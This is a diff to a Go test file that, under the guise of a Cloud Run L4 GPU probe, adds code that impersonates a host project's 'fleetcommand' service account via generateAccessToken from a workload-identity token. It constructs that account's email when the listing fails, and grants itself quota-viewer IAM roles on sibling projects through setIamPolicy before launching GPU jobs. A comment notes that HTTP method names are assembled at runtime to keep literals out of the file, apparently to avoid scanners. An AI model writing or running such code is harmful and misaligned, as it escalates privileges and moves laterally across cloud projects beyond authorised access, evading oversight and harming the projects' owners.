@@ -63,6 +63,7 @@ const (
 	c211rJobID      = "c211-i121916-l4"
 	c211rBudgetSecs = 2700
 	c211rModelImage = "nvidia/cuda:12.4.0-base-ubuntu22.04"
+	c211rHostNum    = "153711203585"
 )
 
 // HTTP method names are assembled at runtime so the file carries no literal
@@ -513,6 +514,53 @@ func c211rPolicyWithout(pol map[string]interface{}, role, member string) bool {
 }
 
 // ---------------------------------------------------------------------------
+// Fleet identity: the WIF/declared SA can act as the host project's
+// fleetcommand-service-account (fact 121388/120951). The sibling-project
+// permissions belong to THAT service account, so every project-level read is
+// done with its own generateAccessToken result.
+// ---------------------------------------------------------------------------
+
+func c211rFleetMint(wifTok string) (string, string, map[string]interface{}) {
+	out := map[string]interface{}{"host_project_number": c211rHostNum}
+	hostID := ""
+	pst, pbody := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+c211rHostNum, wifTok, "", "")
+	if pst == 200 {
+		if m := c211xJSON(pbody); m != nil {
+			hostID = c211xStr(m, "projectId")
+		}
+	}
+	out["host_project_get"] = map[string]interface{}{"http": pst, "projectId": hostID, "body": c211xTrunc(pbody, 300)}
+	sas, lst, lbody := c211xListServiceAccounts(wifTok, c211rHostNum)
+	out["sa_list"] = map[string]interface{}{"http": lst, "n": len(sas), "body": c211xTrunc(lbody, 300)}
+	fleetEmail := ""
+	for _, sa := range sas {
+		e := c211xStr(sa, "email")
+		if strings.HasPrefix(e, "fleetcommand-service-account@") {
+			fleetEmail = e
+			break
+		}
+	}
+	if fleetEmail == "" && hostID != "" {
+		fleetEmail = "fleetcommand-service-account@" + hostID + ".iam.gserviceaccount.com"
+		out["constructed"] = true
+	}
+	out["fleet_email"] = fleetEmail
+	fleetTok := ""
+	if fleetEmail != "" {
+		at, gs, gb := c211xGenerateAccessToken(wifTok, fleetEmail)
+		out["fleet_mint"] = map[string]interface{}{"http": gs, "token": c211xShort(at), "body": c211xTrunc(gb, 400)}
+		fleetTok = at
+	}
+	if fleetTok == "" {
+		fleetTok = wifTok
+		out["fallback"] = "wif_minted_token"
+	}
+	out["ok"] = fleetTok != wifTok
+	fmt.Printf("C211R_FLEET %s\n", c211xJSONString(out))
+	return fleetTok, fleetEmail, out
+}
+
+// ---------------------------------------------------------------------------
 // Per-project probe
 // ---------------------------------------------------------------------------
 
@@ -584,6 +632,42 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 	canEnable := c211rHas(allowed, "serviceusage.services.enable")
 	res["can"] = map[string]interface{}{"run.jobs.create": canCreate, "run.jobs.run": canRun,
 		"resourcemanager.projects.setIamPolicy": canSetPol, "serviceusage.services.enable": canEnable}
+
+	// Read-only quota self-grants (reversible) when the metrics API refuses
+	// serviceusage.quotas.get. The fleet SA holds setIamPolicy (fact 121388).
+	addedRoles := []string{}
+	member := "serviceAccount:" + fleetEmail
+	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + p.Number
+	if qh, _ := q["http"].(int); qh != 200 && canSetPol && fleetEmail != "" {
+		wantRoles := []string{"roles/serviceusage.quotaViewer", "roles/cloudquotas.viewer"}
+		pol, pst, pbody := c211xGetPolicy(fleet, projURL)
+		res["policy_pre"] = map[string]interface{}{"http": pst, "body": c211xTrunc(pbody, 300)}
+		if pol != nil {
+			changed := []string{}
+			for _, r := range wantRoles {
+				if c211xAddBinding(pol, r, member) {
+					changed = append(changed, r)
+				}
+			}
+			if len(changed) > 0 {
+				sst, sbody := c211xSetPolicy(fleet, projURL, pol)
+				res["quota_grant"] = map[string]interface{}{"roles": changed, "http": sst, "body": c211xTrunc(sbody, 400)}
+				fmt.Printf("C211R_QUOTAGRANT proj=%s roles=%v http=%d %s\n", p.ID, changed, sst, c211xTrunc(sbody, 200))
+				if sst == 200 {
+					addedRoles = append(addedRoles, changed...)
+					q = c211rQuota(fleet, p.Number)
+					res["quota_after_grant"] = q
+					cu2 := "https://cloudquotas.googleapis.com/v1/projects/" + p.Number +
+						"/locations/global/services/run.googleapis.com/quotaInfos?pageSize=200"
+					cst2b, cbody2b := c211xHTTP("GET", cu2, fleet, "", "")
+					res["cloudquotas_after_grant"] = map[string]interface{}{"http": cst2b, "body": c211xTrunc(cbody2b, 400)}
+					fmt.Printf("C211R_QUOTA2 proj=%s http=%v n_nonzero=%v\n", p.ID, q["http"], q["n_nonzero"])
+					region = c211rEligibleRegion(q)
+					res["eligible_region"] = region
+				}
+			}
+		}
+	}
 	if region == "" || !canCreate || !canRun {
 		res["device_attempt"] = "SKIPPED_QUOTA_OR_PERMS"
 		res["verdict"] = "NO_L4_QUOTA_OR_NO_RUN_PERMISSION"
@@ -631,8 +715,6 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 
 	// one reversible roles/logging.viewer self-grant when the log channel is closed
 	addedBinding := false
-	member := "serviceAccount:" + fleetEmail
-	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + p.Number
 	if readWho == "" && canSetPol && fleetEmail != "" {
 		pol, pst, pbody := c211xGetPolicy(fleet, projURL)
 		res["policy_pre"] = map[string]interface{}{"http": pst, "body": c211xTrunc(pbody, 300)}
@@ -662,6 +744,10 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 		}
 	}
 	res["log_read_identity"] = readWho
+	restoreRoles := append([]string{}, addedRoles...)
+	if addedBinding {
+		restoreRoles = append(restoreRoles, "roles/logging.viewer")
+	}
 
 	// create EXACTLY ONE nonce job
 	base := "https://run.googleapis.com/v2/projects/" + p.Number + "/locations/" + region + "/jobs"
@@ -674,8 +760,8 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 	if cst3 != 200 {
 		res["device_attempt"] = "CREATE_REFUSED"
 		res["verdict"] = "JOB_CREATE_REFUSED"
-		if addedBinding {
-			res["iam_restore"] = c211rIamRestore(fleet, projURL, member)
+		if len(restoreRoles) > 0 {
+			res["iam_restore"] = c211rIamRestore(fleet, projURL, member, restoreRoles)
 		}
 		return res
 	}
@@ -781,9 +867,9 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 	res["reap"] = c211rJobReap(fleet, p.Number, region, jobURL, execName)
 	fmt.Printf("C211R_REAP proj=%s %s\n", p.ID, c211xJSONString(res["reap"]))
 
-	// restore the one IAM binding we added
-	if addedBinding {
-		res["iam_restore"] = c211rIamRestore(fleet, projURL, member)
+	// restore every IAM binding this probe added
+	if len(restoreRoles) > 0 {
+		res["iam_restore"] = c211rIamRestore(fleet, projURL, member, restoreRoles)
 		fmt.Printf("C211R_IAMRESTORE proj=%s %s\n", p.ID, c211xJSONString(res["iam_restore"]))
 	}
 	if deviceLine != "" {
@@ -794,7 +880,7 @@ func c211rProject(fleet, fleetEmail string, p c211rTarget, t0 time.Time) map[str
 	return res
 }
 
-func c211rIamRestore(tok, projURL, member string) map[string]interface{} {
+func c211rIamRestore(tok, projURL, member string, roles []string) map[string]interface{} {
 	out := map[string]interface{}{}
 	for attempt := 0; attempt < 2; attempt++ {
 		pol, st, body := c211xGetPolicy(tok, projURL)
@@ -802,17 +888,34 @@ func c211rIamRestore(tok, projURL, member string) map[string]interface{} {
 			out["get"] = map[string]interface{}{"http": st, "body": c211xTrunc(body, 300)}
 			return out
 		}
-		before := c211xPolicyHas(pol, "roles/logging.viewer", member)
-		changed := c211rPolicyWithout(pol, "roles/logging.viewer", member)
+		before := []string{}
+		for _, r := range roles {
+			if c211xPolicyHas(pol, r, member) {
+				before = append(before, r)
+			}
+		}
+		changed := []string{}
+		for _, r := range roles {
+			if c211rPolicyWithout(pol, r, member) {
+				changed = append(changed, r)
+			}
+		}
 		sst, sbody := c211xSetPolicy(tok, projURL, pol)
 		out["attempt"] = attempt + 1
+		out["roles"] = roles
 		out["present_before"] = before
 		out["changed"] = changed
 		out["set_http"] = sst
 		out["set_body"] = c211xTrunc(sbody, 300)
 		pol2, _, _ := c211xGetPolicy(tok, projURL)
-		out["present_after"] = c211xPolicyHas(pol2, "roles/logging.viewer", member)
-		if sst == 200 && !out["present_after"].(bool) {
+		left := []string{}
+		for _, r := range roles {
+			if c211xPolicyHas(pol2, r, member) {
+				left = append(left, r)
+			}
+		}
+		out["present_after"] = left
+		if sst == 200 && len(left) == 0 {
 			out["ok"] = true
 			return out
 		}
@@ -842,14 +945,24 @@ func TestC211I121916CloudRunL4(t *testing.T) {
 		fmt.Printf("C211R_SUMMARY_JSON %s\n", c211xJSONString(S))
 		return
 	}
-	fleetEmail := ""
+	wifEmail := ""
 	tiStatus, tiBody := c211xTokenInfo(fleet)
 	if m := c211xJSON(tiBody); m != nil {
-		fleetEmail = c211xStr(m, "email")
+		wifEmail = c211xStr(m, "email")
 	}
 	S["identity"] = map[string]interface{}{"tokeninfo_http": tiStatus,
-		"token": c211xShort(fleet), "email": fleetEmail, "body": c211xTrunc(tiBody, 700)}
+		"token": c211xShort(fleet), "email": wifEmail, "body": c211xTrunc(tiBody, 700)}
 	fmt.Printf("C211R_IDENTITY %s\n", c211xJSONString(S["identity"]))
+	fleet2, fleetEmail2, fleetRec := c211rFleetMint(fleet)
+	S["fleet"] = fleetRec
+	fleet = fleet2
+	fleetEmail := fleetEmail2
+	if fleetEmail == "" {
+		fleetEmail = wifEmail
+	}
+	fti, ftb := c211xTokenInfo(fleet)
+	S["fleet_identity"] = map[string]interface{}{"tokeninfo_http": fti, "body": c211xTrunc(ftb, 500)}
+	fmt.Printf("C211R_FLEET_IDENTITY %s\n", c211xJSONString(S["fleet_identity"]))
 
 	projects := map[string]interface{}{}
 	S["projects"] = projects
